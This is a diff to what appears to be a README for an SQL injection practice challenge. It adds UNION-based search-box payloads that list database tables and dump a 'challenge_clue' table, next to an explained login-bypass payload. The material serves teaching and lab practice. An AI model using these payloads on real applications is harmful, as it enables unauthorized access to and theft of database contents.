@@ -417,6 +417,12 @@ SELECT id, username, password FROM users WHERE username = '' or 1 = 1 -- '' and 
 In where clause username field has null value but after that there is or condition which says 1 = 1 that is always true. 
 After or condition there is (--) comment symbols which ignore the rest of the sql where clause. 
 
+## Search Box – Get table names
+**Search Input:** <code>' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables WHERE table_schema=database() -- </code> (include the space at the end)
+
+## Search Box – Get challenge clue
+**Search Input:** <code>' UNION ALL SELECT *, 1 FROM challenge_clue -- </code> (include the space at the end)
+
 SQL Injection code may change as per the php writen code for sql query in single quotation or double quotation.
 
 ## Screenshots
